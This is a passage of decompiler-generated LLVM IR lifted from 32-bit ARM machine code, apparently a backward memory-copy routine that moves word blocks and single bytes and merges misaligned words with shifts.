  %v1_18f24 = add i32 %v0_18f1c, -32
  %v2_18f24 = inttoptr i32 %v1_18f24 to i32*
  store i32 %v3_18f20, i32* %v2_18f24, align 4
  %v4_18f24 = add i32 %v0_18f1c, -28
  %v5_18f24 = inttoptr i32 %v4_18f24 to i32*
  %v6_18f24 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_18f24, i32* %v5_18f24, align 4
  %v7_18f24 = add i32 %v0_18f1c, -24
  %v8_18f24 = inttoptr i32 %v7_18f24 to i32*
  %v9_18f24 = load i32, i32* @ip, align 4
  store i32 %v9_18f24, i32* %v8_18f24, align 4
  %v10_18f24 = add i32 %v0_18f1c, -20
  %v11_18f24 = inttoptr i32 %v10_18f24 to i32*
  %v12_18f24 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18f24, i32* %v11_18f24, align 4
  store i32 %v1_18f24, i32* %r0.global-to-local, align 4
  %v0_18f28 = load i32, i32* %r2.global-to-local, align 4
  %v2_18f28 = add i32 %v0_18f28, -32
  store i32 %v2_18f28, i32* %r2.global-to-local, align 4
  %v6_18f2c = icmp slt i32 %v0_18f28, 32
  br i1 %v6_18f2c, label %dec_label_pc_18f30.loopexit, label %dec_label_pc_18f18.dec_label_pc_18f18_crit_edge

dec_label_pc_18f18.dec_label_pc_18f18_crit_edge:  ; preds = %dec_label_pc_18f18
  %v0_18f18.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18f18

dec_label_pc_18f30.loopexit:                      ; preds = %dec_label_pc_18f18
  %v4_18f28 = sub i32 31, %v0_18f28
  %v5_18f28 = and i32 %v4_18f28, %v0_18f28
  %v6_18f28 = icmp slt i32 %v5_18f28, 0
  %v7_18f28 = icmp slt i32 %v2_18f28, 0
  store i1 %v6_18f28, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18f28, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18f30

dec_label_pc_18f30:                               ; preds = %dec_label_pc_18f30.loopexit, %dec_label_pc_18f0c
  %v6_18f38 = phi i32 [ %v1_18f24, %dec_label_pc_18f30.loopexit ], [ %v0_18f1c37, %dec_label_pc_18f0c ]
  %v0_18f40.pr = phi i32 [ %v2_18f28, %dec_label_pc_18f30.loopexit ], [ %v2_18f10, %dec_label_pc_18f0c ]
  %v4_18f30 = add i32 %v0_18f40.pr, 16
  %v6_18f30 = sub i32 0, %v0_18f40.pr
  %v7_18f30 = and i32 %v4_18f30, %v6_18f30
  %v8_18f30 = icmp slt i32 %v7_18f30, 0
  store i1 %v8_18f30, i1* %cpsr_v.global-to-local, align 1
  %v9_18f30 = icmp slt i32 %v4_18f30, 0
  store i1 %v9_18f30, i1* %cpsr_n.global-to-local, align 1
  %v10_18f30 = icmp eq i32 %v4_18f30, 0
  store i1 %v10_18f30, i1* %cpsr_z.global-to-local, align 1
  %v5_18f34 = icmp slt i32 %v0_18f40.pr, -16
  br i1 %v5_18f34, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_18f30
  %v6_18f34 = load i32, i32* %r1.global-to-local, align 4
  %v7_18f34 = add i32 %v6_18f34, -4
  %v8_18f34 = inttoptr i32 %v7_18f34 to i32*
  %v9_18f34 = load i32, i32* %v8_18f34, align 4
  store i32 %v9_18f34, i32* @r3, align 4
  %v10_18f34 = add i32 %v6_18f34, -8
  %v11_18f34 = inttoptr i32 %v10_18f34 to i32*
  %v12_18f34 = load i32, i32* %v11_18f34, align 4
  store i32 %v12_18f34, i32* %r4.global-to-local, align 4
  %v13_18f34 = add i32 %v6_18f34, -12
  %v14_18f34 = inttoptr i32 %v13_18f34 to i32*
  %v15_18f34 = load i32, i32* %v14_18f34, align 4
  store i32 %v15_18f34, i32* @ip, align 4
  %v16_18f34 = add i32 %v6_18f34, -16
  %v17_18f34 = inttoptr i32 %v16_18f34 to i32*
  %v18_18f34 = load i32, i32* %v17_18f34, align 4
  store i32 %v18_18f34, i32* %lr.global-to-local, align 4
  store i32 %v16_18f34, i32* %r1.global-to-local, align 4
  %v7_18f38 = add i32 %v6_18f38, -16
  %v8_18f38 = inttoptr i32 %v7_18f38 to i32*
  store i32 %v9_18f34, i32* %v8_18f38, align 4
  %v10_18f38 = add i32 %v6_18f38, -12
  %v11_18f38 = inttoptr i32 %v10_18f38 to i32*
  %v12_18f38 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_18f38, i32* %v11_18f38, align 4
  %v13_18f38 = add i32 %v6_18f38, -8
  %v14_18f38 = inttoptr i32 %v13_18f38 to i32*
  %v15_18f38 = load i32, i32* @ip, align 4
  store i32 %v15_18f38, i32* %v14_18f38, align 4
  %v16_18f38 = add i32 %v6_18f38, -4
  %v17_18f38 = inttoptr i32 %v16_18f38 to i32*
  %v18_18f38 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_18f38, i32* %v17_18f38, align 4
  store i32 %v7_18f38, i32* %r0.global-to-local, align 4
  %v6_18f3c = load i32, i32* %r2.global-to-local, align 4
  %v7_18f3c = add i32 %v6_18f3c, -16
  store i32 %v7_18f3c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18f30, %bb147
  %v6_18f48 = phi i32 [ %v7_18f38, %bb147 ], [ %v6_18f38, %dec_label_pc_18f30 ]
  %v0_18f40 = phi i32 [ %v7_18f3c, %bb147 ], [ %v0_18f40.pr, %dec_label_pc_18f30 ]
  %v4_18f40 = add i32 %v0_18f40, 20
  store i32 %v4_18f40, i32* %r2.global-to-local, align 4
  %v6_18f40 = sub i32 0, %v0_18f40
  %v7_18f40 = and i32 %v4_18f40, %v6_18f40
  %v8_18f40 = icmp slt i32 %v7_18f40, 0
  store i1 %v8_18f40, i1* %cpsr_v.global-to-local, align 1
  %v9_18f40 = icmp slt i32 %v4_18f40, 0
  store i1 %v9_18f40, i1* %cpsr_n.global-to-local, align 1
  %v10_18f40 = icmp eq i32 %v4_18f40, 0
  store i1 %v10_18f40, i1* %cpsr_z.global-to-local, align 1
  %v5_18f44 = icmp slt i32 %v0_18f40, -20
  br i1 %v5_18f44, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_18f44 = load i32, i32* %r1.global-to-local, align 4
  %v7_18f44 = add i32 %v6_18f44, -4
  %v8_18f44 = inttoptr i32 %v7_18f44 to i32*
  %v9_18f44 = load i32, i32* %v8_18f44, align 4
  store i32 %v9_18f44, i32* @r3, align 4
  %v10_18f44 = add i32 %v6_18f44, -8
  %v11_18f44 = inttoptr i32 %v10_18f44 to i32*
  %v12_18f44 = load i32, i32* %v11_18f44, align 4
  store i32 %v12_18f44, i32* @ip, align 4
  %v13_18f44 = add i32 %v6_18f44, -12
  %v14_18f44 = inttoptr i32 %v13_18f44 to i32*
  %v15_18f44 = load i32, i32* %v14_18f44, align 4
  store i32 %v15_18f44, i32* %lr.global-to-local, align 4
  store i32 %v13_18f44, i32* %r1.global-to-local, align 4
  %v7_18f48 = add i32 %v6_18f48, -12
  %v8_18f48 = inttoptr i32 %v7_18f48 to i32*
  store i32 %v9_18f44, i32* %v8_18f48, align 4
  %v10_18f48 = add i32 %v6_18f48, -8
  %v11_18f48 = inttoptr i32 %v10_18f48 to i32*
  %v12_18f48 = load i32, i32* @ip, align 4
  store i32 %v12_18f48, i32* %v11_18f48, align 4
  %v13_18f48 = add i32 %v6_18f48, -4
  %v14_18f48 = inttoptr i32 %v13_18f48 to i32*
  %v15_18f48 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_18f48, i32* %v14_18f48, align 4
  store i32 %v7_18f48, i32* %r0.global-to-local, align 4
  %v6_18f4c = load i32, i32* %r2.global-to-local, align 4
  %v7_18f4c = add i32 %v6_18f4c, -12
  store i32 %v7_18f4c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_18f6c45 = phi i32 [ %v6_18f48, %.thread2 ], [ %v7_18f48, %bb148 ]
  %v0_18f5443 = phi i32 [ %v4_18f40, %.thread2 ], [ %v7_18f4c, %bb148 ]
  %v2_18f50 = load i8*, i8** %stack_var_-8, align 4
  %v3_18f50 = ptrtoint i8* %v2_18f50 to i32
  store i32 %v3_18f50, i32* @r4, align 4
  store i32 %v8_18f0c, i32* @lr, align 4
  br label %dec_label_pc_18f54

dec_label_pc_18f54:                               ; preds = %dec_label_pc_18f04, %.thread4
  %v7_18f64 = phi i32 [ %v0_18f1c37, %dec_label_pc_18f04 ], [ %v6_18f6c45, %.thread4 ]
  %v0_18f54 = phi i32 [ %v2_18f04, %dec_label_pc_18f04 ], [ %v0_18f5443, %.thread4 ]
  %v2_18f54 = add i32 %v0_18f54, 8
  store i32 %v2_18f54, i32* %r2.global-to-local, align 4
  %v4_18f54 = sub i32 0, %v0_18f54
  %v5_18f54 = and i32 %v2_18f54, %v4_18f54
  %v6_18f54 = icmp slt i32 %v5_18f54, 0
  store i1 %v6_18f54, i1* %cpsr_v.global-to-local, align 1
  %v7_18f54 = icmp slt i32 %v2_18f54, 0
  store i1 %v7_18f54, i1* %cpsr_n.global-to-local, align 1
  %v8_18f54 = icmp eq i32 %v2_18f54, 0
  store i1 %v8_18f54, i1* %cpsr_z.global-to-local, align 1
  %v5_18f58 = icmp slt i32 %v0_18f54, -8
  br i1 %v5_18f58, label %bb150, label %dec_label_pc_18f5c

dec_label_pc_18f5c:                               ; preds = %dec_label_pc_18f54
  %v6_18f5c = add i32 %v0_18f54, 4
  store i32 %v6_18f5c, i32* %r2.global-to-local, align 4
  %v8_18f5c = sub i32 -5, %v0_18f54
  %v9_18f5c = and i32 %v8_18f5c, %v2_18f54
  %v10_18f5c = icmp slt i32 %v9_18f5c, 0
  store i1 %v10_18f5c, i1* %cpsr_v.global-to-local, align 1
  %v11_18f5c = icmp slt i32 %v6_18f5c, 0
  store i1 %v11_18f5c, i1* %cpsr_n.global-to-local, align 1
  %v12_18f5c = icmp eq i32 %v2_18f54, 4
  store i1 %v12_18f5c, i1* %cpsr_z.global-to-local, align 1
  %v5_18f60 = icmp slt i32 %v2_18f54, 4
  %v6_18f60 = load i32, i32* %r1.global-to-local, align 4
  %v7_18f60 = add i32 %v6_18f60, -4
  %v8_18f60 = inttoptr i32 %v7_18f60 to i32*
  %v9_18f60 = load i32, i32* %v8_18f60, align 4
  store i32 %v9_18f60, i32* @r3, align 4
  br i1 %v5_18f60, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_18f5c
  store i32 %v7_18f60, i32* %r1.global-to-local, align 4
  %v8_18f64 = add i32 %v7_18f64, -4
  %v9_18f64 = inttoptr i32 %v8_18f64 to i32*
  store i32 %v9_18f60, i32* %v9_18f64, align 4
  %v10_18f64 = load i32, i32* %r0.global-to-local, align 4
  %v11_18f64 = add i32 %v10_18f64, -4
  store i32 %v11_18f64, i32* %r0.global-to-local, align 4
  %v0_18f74.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_18f5c
  %v10_18f68 = add i32 %v6_18f60, -8
  %v11_18f68 = inttoptr i32 %v10_18f68 to i32*
  %v12_18f68 = load i32, i32* %v11_18f68, align 4
  store i32 %v12_18f68, i32* @ip, align 4
  store i32 %v10_18f68, i32* %r1.global-to-local, align 4
  %v7_18f6c = add i32 %v7_18f64, -8
  %v8_18f6c = inttoptr i32 %v7_18f6c to i32*
  store i32 %v9_18f60, i32* %v8_18f6c, align 4
  %v10_18f6c = add i32 %v7_18f64, -4
  %v11_18f6c = inttoptr i32 %v10_18f6c to i32*
  %v12_18f6c = load i32, i32* @ip, align 4
  store i32 %v12_18f6c, i32* %v11_18f6c, align 4
  store i32 %v7_18f6c, i32* %r0.global-to-local, align 4
  %v6_18f70 = load i32, i32* %r2.global-to-local, align 4
  %v7_18f70 = add i32 %v6_18f70, -4
  store i32 %v7_18f70, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_18f54, %dec_label_pc_18ee4, %dec_label_pc_19118, %dec_label_pc_190ac, %dec_label_pc_19040, %bb149
  %v2_18f78 = phi i32 [ %v11_18f64, %.thread8 ], [ %v0_1901020, %.thread14 ], [ %v7_18f64, %dec_label_pc_18f54 ], [ %v2_18ee8, %dec_label_pc_18ee4 ], [ %v2_18f8453, %dec_label_pc_19118 ], [ %v2_18f8452, %dec_label_pc_190ac ], [ %v2_18f8451, %dec_label_pc_19040 ], [ %v7_18f6c, %bb149 ]
  %v0_18f74 = phi i32 [ %v0_18f74.pre, %.thread8 ], [ %v2_18fb8, %.thread14 ], [ %v2_18f54, %dec_label_pc_18f54 ], [ %v2_18eec, %dec_label_pc_18ee4 ], [ %v0_18f7449, %dec_label_pc_19118 ], [ %v0_18f7448, %dec_label_pc_190ac ], [ %v0_18f7447, %dec_label_pc_19040 ], [ %v7_18f70, %bb149 ]
  %v1_18f74 = add i32 %v0_18f74, 4
  store i32 %v1_18f74, i32* %r2.global-to-local, align 4
  %v3_18f74 = sub i32 0, %v0_18f74
  %v4_18f74 = and i32 %v1_18f74, %v3_18f74
  %v5_18f74 = icmp slt i32 %v4_18f74, 0
  store i1 %v5_18f74, i1* %cpsr_v.global-to-local, align 1
  %v6_18f74 = icmp slt i32 %v1_18f74, 0
  store i1 %v6_18f74, i1* %cpsr_n.global-to-local, align 1
  %v7_18f74 = icmp eq i32 %v1_18f74, 0
  store i1 %v7_18f74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18f74, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_18f7c = add i32 %v0_18f74, 2
  %v3_18f7c = sub i32 -3, %v0_18f74
  %v4_18f7c = and i32 %v3_18f7c, %v1_18f74
  %v5_18f7c = icmp slt i32 %v4_18f7c, 0
  store i1 %v5_18f7c, i1* %cpsr_v.global-to-local, align 1
  %v6_18f7c = icmp slt i32 %v1_18f7c, 0
  store i1 %v6_18f7c, i1* %cpsr_n.global-to-local, align 1
  %v7_18f7c = icmp eq i32 %v1_18f74, 2
  store i1 %v7_18f7c, i1* %cpsr_z.global-to-local, align 1
  %v0_18f80 = load i32, i32* %r1.global-to-local, align 4
  %v1_18f80 = add i32 %v0_18f80, -1
  %v2_18f80 = inttoptr i32 %v1_18f80 to i8*
  %v3_18f80 = load i8, i8* %v2_18f80, align 1
  %v4_18f80 = zext i8 %v3_18f80 to i32
  store i32 %v4_18f80, i32* @r3, align 4
  store i32 %v1_18f80, i32* %r1.global-to-local, align 4
  %v3_18f84 = add i32 %v2_18f78, -1
  %v4_18f84 = inttoptr i32 %v3_18f84 to i8*
  store i8 %v3_18f80, i8* %v4_18f84, align 1
  %v5_18f84 = load i32, i32* %r0.global-to-local, align 4
  %v6_18f84 = add i32 %v5_18f84, -1
  store i32 %v6_18f84, i32* %r0.global-to-local, align 4
  %v0_18f88 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_18f88 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_18f88 = xor i1 %v0_18f88, %v1_18f88
  br i1 %v2_18f88, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_18f88 = load i32, i32* %r1.global-to-local, align 4
  %v4_18f88 = add i32 %v3_18f88, -1
  %v5_18f88 = inttoptr i32 %v4_18f88 to i8*
  %v6_18f88 = load i8, i8* %v5_18f88, align 1
  %v7_18f88 = zext i8 %v6_18f88 to i32
  store i32 %v7_18f88, i32* @r3, align 4
  store i32 %v4_18f88, i32* %r1.global-to-local, align 4
  %v6_18f8c = add i32 %v5_18f84, -2
  %v7_18f8c = inttoptr i32 %v6_18f8c to i8*
  store i8 %v6_18f88, i8* %v7_18f8c, align 1
  %v8_18f8c = load i32, i32* %r0.global-to-local, align 4
  %v9_18f8c = add i32 %v8_18f8c, -1
  store i32 %v9_18f8c, i32* %r0.global-to-local, align 4
  %v1_18f90.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_18f90.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_18f94 = phi i32 [ %v9_18f8c, %bb152 ], [ %v6_18f84, %bb151 ]
  %v2_18f94 = phi i1 [ %v2_18f90.pre, %bb152 ], [ %v1_18f88, %bb151 ]
  %v1_18f94 = phi i1 [ %v1_18f90.pre, %bb152 ], [ %v0_18f88, %bb151 ]
  %v0_18f90 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_18f90 = xor i1 %v2_18f94, %v1_18f94
  %v4_18f90 = or i1 %v0_18f90, %v3_18f90
  br i1 %v4_18f90, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_18f90 = load i32, i32* %r1.global-to-local, align 4
  %v6_18f90 = add i32 %v5_18f90, -1
  %v7_18f90 = inttoptr i32 %v6_18f90 to i8*
  %v8_18f90 = load i8, i8* %v7_18f90, align 1
  %v9_18f90 = zext i8 %v8_18f90 to i32
  store i32 %v9_18f90, i32* @r3, align 4
  store i32 %v6_18f90, i32* %r1.global-to-local, align 4
  %v8_18f94 = add i32 %v7_18f94, -1
  %v9_18f94 = inttoptr i32 %v8_18f94 to i8*
  store i8 %v8_18f90, i8* %v9_18f94, align 1
  %v10_18f94 = load i32, i32* %r0.global-to-local, align 4
  %v11_18f94 = add i32 %v10_18f94, -1
  store i32 %v11_18f94, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_18f9c:                               ; preds = %dec_label_pc_18ef4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_18f9c = icmp eq i32 %v1_18ef4, 1
  store i1 %v8_18f9c, i1* %cpsr_n.global-to-local, align 1
  %v9_18f9c = icmp eq i32 %v1_18ef4, 2
  store i1 %v9_18f9c, i1* %cpsr_z.global-to-local, align 1
  %v1_18fa0 = add i32 %v2_18ee4, -1
  %v2_18fa0 = inttoptr i32 %v1_18fa0 to i8*
  %v3_18fa0 = load i8, i8* %v2_18fa0, align 1
  %v4_18fa0 = zext i8 %v3_18fa0 to i32
  store i32 %v4_18fa0, i32* @r3, align 4
  store i32 %v1_18fa0, i32* %r1.global-to-local, align 4
  %v3_18fa4 = add i32 %v2_18ee8, -1
  %v4_18fa4 = inttoptr i32 %v3_18fa4 to i8*
  store i8 %v3_18fa0, i8* %v4_18fa4, align 1
  %v5_18fa4 = load i32, i32* %r0.global-to-local, align 4
  %v6_18fa4 = add i32 %v5_18fa4, -1
  store i32 %v6_18fa4, i32* %r0.global-to-local, align 4
  br i1 %v8_18f9c, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_18f9c
  %v6_18fa8 = load i32, i32* %r1.global-to-local, align 4
  %v7_18fa8 = add i32 %v6_18fa8, -1
  %v8_18fa8 = inttoptr i32 %v7_18fa8 to i8*
  %v9_18fa8 = load i8, i8* %v8_18fa8, align 1
  %v10_18fa8 = zext i8 %v9_18fa8 to i32
  store i32 %v10_18fa8, i32* @r3, align 4
  store i32 %v7_18fa8, i32* %r1.global-to-local, align 4
  %v9_18fac = add i32 %v5_18fa4, -2
  %v10_18fac = inttoptr i32 %v9_18fac to i8*
  store i8 %v9_18fa8, i8* %v10_18fac, align 1
  %v11_18fac = load i32, i32* %r0.global-to-local, align 4
  %v12_18fac = add i32 %v11_18fac, -1
  store i32 %v12_18fac, i32* %r0.global-to-local, align 4
  br i1 %v9_18f9c, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_18fb0 = load i32, i32* %r1.global-to-local, align 4
  %v9_18fb0 = add i32 %v8_18fb0, -1
  %v10_18fb0 = inttoptr i32 %v9_18fb0 to i8*
  %v11_18fb0 = load i8, i8* %v10_18fb0, align 1
  %v12_18fb0 = zext i8 %v11_18fb0 to i32
  store i32 %v12_18fb0, i32* @r3, align 4
  store i32 %v9_18fb0, i32* %r1.global-to-local, align 4
  %v11_18fb4 = add i32 %v11_18fac, -2
  %v12_18fb4 = inttoptr i32 %v11_18fb4 to i8*
  store i8 %v11_18fb0, i8* %v12_18fb4, align 1
  %v13_18fb4 = load i32, i32* %r0.global-to-local, align 4
  %v14_18fb4 = add i32 %v13_18fb4, -1
  store i32 %v14_18fb4, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_18f9c, %bb155
  %v0_1901020 = phi i32 [ %v12_18fac, %bb154 ], [ %v6_18fa4, %dec_label_pc_18f9c ], [ %v14_18fb4, %bb155 ]
  %v0_18fb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_18fb8 = load i32, i32* @ip, align 4
  %v2_18fb8 = sub i32 %v0_18fb8, %v1_18fb8
  store i32 %v2_18fb8, i32* %r2.global-to-local, align 4
  %v4_18fb8 = xor i32 %v1_18fb8, %v0_18fb8
  %v5_18fb8 = xor i32 %v2_18fb8, %v0_18fb8
  %v6_18fb8 = and i32 %v5_18fb8, %v4_18fb8
  %v7_18fb8 = icmp slt i32 %v6_18fb8, 0
  store i1 %v7_18fb8, i1* %cpsr_v.global-to-local, align 1
  %v8_18fb8 = icmp slt i32 %v2_18fb8, 0
  store i1 %v8_18fb8, i1* %cpsr_n.global-to-local, align 1
  %v9_18fb8 = icmp eq i32 %v0_18fb8, %v1_18fb8
  store i1 %v9_18fb8, i1* %cpsr_z.global-to-local, align 1
  %v5_18fbc = icmp slt i32 %v0_18fb8, %v1_18fb8
  br i1 %v5_18fbc, label %bb150, label %dec_label_pc_18fc0

dec_label_pc_18fc0:                               ; preds = %.thread14
  %v0_18fc0 = load i32, i32* %r1.global-to-local, align 4
  %v1_18fc0 = urem i32 %v0_18fc0, 4
  store i32 %v1_18fc0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18fc0 = icmp eq i32 %v1_18fc0, 0
  store i1 %v2_18fc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18fc0, label %dec_label_pc_18f04, label %dec_label_pc_18fc8

dec_label_pc_18fc8:                               ; preds = %dec_label_pc_18efc, %dec_label_pc_18fc0
  %v0_1901019 = phi i32 [ %v2_18ee8, %dec_label_pc_18efc ], [ %v0_1901020, %dec_label_pc_18fc0 ]
  %v0_190bc = phi i32 [ %v2_18eec, %dec_label_pc_18efc ], [ %v2_18fb8, %dec_label_pc_18fc0 ]
  %v0_18fc8 = phi i32 [ %v2_18ee4, %dec_label_pc_18efc ], [ %v0_18fc0, %dec_label_pc_18fc0 ]
  %v0_18fd0 = phi i32 [ %v1_18efc, %dec_label_pc_18efc ], [ %v1_18fc0, %dec_label_pc_18fc0 ]
  %v1_18fc8 = and i32 %v0_18fc8, -4
  store i32 %v1_18fc8, i32* %r1.global-to-local, align 4
  %v1_18fcc = inttoptr i32 %v1_18fc8 to i32*
  %v2_18fcc = load i32, i32* %v1_18fcc, align 4
  store i32 %v2_18fcc, i32* @r3, align 4
  %v7_18fd0 = icmp ult i32 %v0_18fd0, 2
  %v2_190b4 = add i32 %v0_190bc, -12
  %v4_190b4 = sub i32 11, %v0_190bc
  %v5_190b4 = and i32 %v4_190b4, %v0_190bc
  %v6_190b4 = icmp slt i32 %v5_190b4, 0
  store i1 %v6_190b4, i1* %cpsr_v.global-to-local, align 1
  %v7_190b4 = icmp slt i32 %v2_190b4, 0
  store i1 %v7_190b4, i1* %cpsr_n.global-to-local, align 1
  %v8_190b4 = icmp eq i32 %v0_190bc, 12
  store i1 %v8_190b4, i1* %cpsr_z.global-to-local, align 1
  %v5_190b8 = icmp slt i32 %v0_190bc, 12
  br i1 %v7_18fd0, label %dec_label_pc_190b4, label %dec_label_pc_18fd8

dec_label_pc_18fd8:                               ; preds = %dec_label_pc_18fc8
  %v8_18fd0 = icmp eq i32 %v0_18fd0, 2
  br i1 %v8_18fd0, label %dec_label_pc_19048, label %dec_label_pc_18fdc

dec_label_pc_18fdc:                               ; preds = %dec_label_pc_18fd8
  br i1 %v5_190b8, label %dec_label_pc_19028, label %dec_label_pc_18fe4

dec_label_pc_18fe4:                               ; preds = %dec_label_pc_18fdc
  store i32 %v2_190b4, i32* %r2.global-to-local, align 4
  %v3_18fe8 = load i32, i32* @r4, align 4
  store i32 %v3_18fe8, i32* %stack_var_-12, align 4
  %v6_18fe8 = load i32, i32* @r5, align 4
  %v8_18fe8 = inttoptr i32 %v6_18fe8 to i8*
  store i8* %v8_18fe8, i8** %stack_var_-8, align 4
  %v11_18fe8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_18fec

dec_label_pc_18fec:                               ; preds = %dec_label_pc_18fec.dec_label_pc_18fec_crit_edge, %dec_label_pc_18fe4
  %v0_19010 = phi i32 [ %v1_19010, %dec_label_pc_18fec.dec_label_pc_18fec_crit_edge ], [ %v0_1901019, %dec_label_pc_18fe4 ]
  %v0_18ff0 = phi i32 [ %v0_18ff0.pre, %dec_label_pc_18fec.dec_label_pc_18fec_crit_edge ], [ %v1_18fc8, %dec_label_pc_18fe4 ]
  %v0_18fec = phi i32 [ %v0_18fec.pre, %dec_label_pc_18fec.dec_label_pc_18fec_crit_edge ], [ %v2_18fcc, %dec_label_pc_18fe4 ]
  %v3_18fec = mul i32 %v0_18fec, 256
  store i32 %v3_18fec, i32* %lr.global-to-local, align 4
  %v1_18ff0 = add i32 %v0_18ff0, -4
  %v2_18ff0 = inttoptr i32 %v1_18ff0 to i32*
  %v3_18ff0 = load i32, i32* %v2_18ff0, align 4
  store i32 %v3_18ff0, i32* @r3, align 4
  %v4_18ff0 = add i32 %v0_18ff0, -8
  %v5_18ff0 = inttoptr i32 %v4_18ff0 to i32*
  %v6_18ff0 = load i32, i32* %v5_18ff0, align 4
  store i32 %v6_18ff0, i32* %r4.global-to-local, align 4
  %v7_18ff0 = add i32 %v0_18ff0, -12
  %v8_18ff0 = inttoptr i32 %v7_18ff0 to i32*
  %v9_18ff0 = load i32, i32* %v8_18ff0, align 4
  store i32 %v9_18ff0, i32* %r5.global-to-local, align 4
  %v10_18ff0 = add i32 %v0_18ff0, -16
  %v11_18ff0 = inttoptr i32 %v10_18ff0 to i32*
  %v12_18ff0 = load i32, i32* %v11_18ff0, align 4
  store i32 %v10_18ff0, i32* %r1.global-to-local, align 4
  %v4_18ff4 = udiv i32 %v12_18ff0, 16777216
  %v5_18ff4 = or i32 %v4_18ff4, %v3_18fec
  store i32 %v5_18ff4, i32* %lr.global-to-local, align 4
  %v3_18ff8 = mul i32 %v12_18ff0, 256
  %v4_18ffc = udiv i32 %v9_18ff0, 16777216
  %v5_18ffc = or i32 %v3_18ff8, %v4_18ffc
  store i32 %v5_18ffc, i32* @ip, align 4
  %v3_19000 = mul i32 %v9_18ff0, 256
  %v4_19004 = udiv i32 %v6_18ff0, 16777216
  %v5_19004 = or i32 %v3_19000, %v4_19004
  store i32 %v5_19004, i32* %r5.global-to-local, align 4
  %v3_19008 = mul i32 %v6_18ff0, 256
  %v4_1900c = udiv i32 %v3_18ff0, 16777216
  %v5_1900c = or i32 %v3_19008, %v4_1900c
  store i32 %v5_1900c, i32* %r4.global-to-local, align 4
  %v1_19010 = add i32 %v0_19010, -16
  %v2_19010 = inttoptr i32 %v1_19010 to i32*
  store i32 %v5_1900c, i32* %v2_19010, align 4
  %v4_19010 = add i32 %v0_19010, -12
  %v5_19010 = inttoptr i32 %v4_19010 to i32*
  %v6_19010 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_19010, i32* %v5_19010, align 4
  %v7_19010 = add i32 %v0_19010, -8
  %v8_19010 = inttoptr i32 %v7_19010 to i32*
  %v9_19010 = load i32, i32* @ip, align 4
  store i32 %v9_19010, i32* %v8_19010, align 4
  %v10_19010 = add i32 %v0_19010, -4
  %v11_19010 = inttoptr i32 %v10_19010 to i32*
  %v12_19010 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_19010, i32* %v11_19010, align 4
  store i32 %v1_19010, i32* %r0.global-to-local, align 4
  %v0_19014 = load i32, i32* %r2.global-to-local, align 4
  %v2_19014 = add i32 %v0_19014, -16
  store i32 %v2_19014, i32* %r2.global-to-local, align 4
  %v6_19018 = icmp slt i32 %v0_19014, 16
  br i1 %v6_19018, label %dec_label_pc_1901c, label %dec_label_pc_18fec.dec_label_pc_18fec_crit_edge

dec_label_pc_18fec.dec_label_pc_18fec_crit_edge:  ; preds = %dec_label_pc_18fec
  %v0_18fec.pre = load i32, i32* @r3, align 4
  %v0_18ff0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18fec

dec_label_pc_1901c:                               ; preds = %dec_label_pc_18fec
  %v2_1901c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1901c, i32* @r4, align 4
  %v5_1901c = load i8*, i8** %stack_var_-8, align 4
  %v6_1901c = ptrtoint i8* %v5_1901c to i32
  store i32 %v6_1901c, i32* @r5, align 4
  store i32 %v11_18fe8, i32* @lr, align 4
  %v2_19020 = add i32 %v0_19014, -4
  store i32 %v2_19020, i32* %r2.global-to-local, align 4
  %v4_19020 = add i32 %v0_19014, 2147483632
  %v5_19020 = and i32 %v2_19020, %v4_19020
  %v6_19020 = icmp slt i32 %v5_19020, 0
  store i1 %v6_19020, i1* %cpsr_v.global-to-local, align 1
  %v7_19020 = icmp slt i32 %v2_19020, 0
  store i1 %v7_19020, i1* %cpsr_n.global-to-local, align 1
  %v8_19020 = icmp eq i32 %v2_19020, 0
  store i1 %v8_19020, i1* %cpsr_z.global-to-local, align 1
  %v5_19024 = icmp slt i32 %v2_19014, -12
  br i1 %v5_19024, label %dec_label_pc_19040, label %dec_label_pc_19028

dec_label_pc_19028:                               ; preds = %dec_label_pc_1901c, %dec_label_pc_18fdc, %dec_label_pc_19028
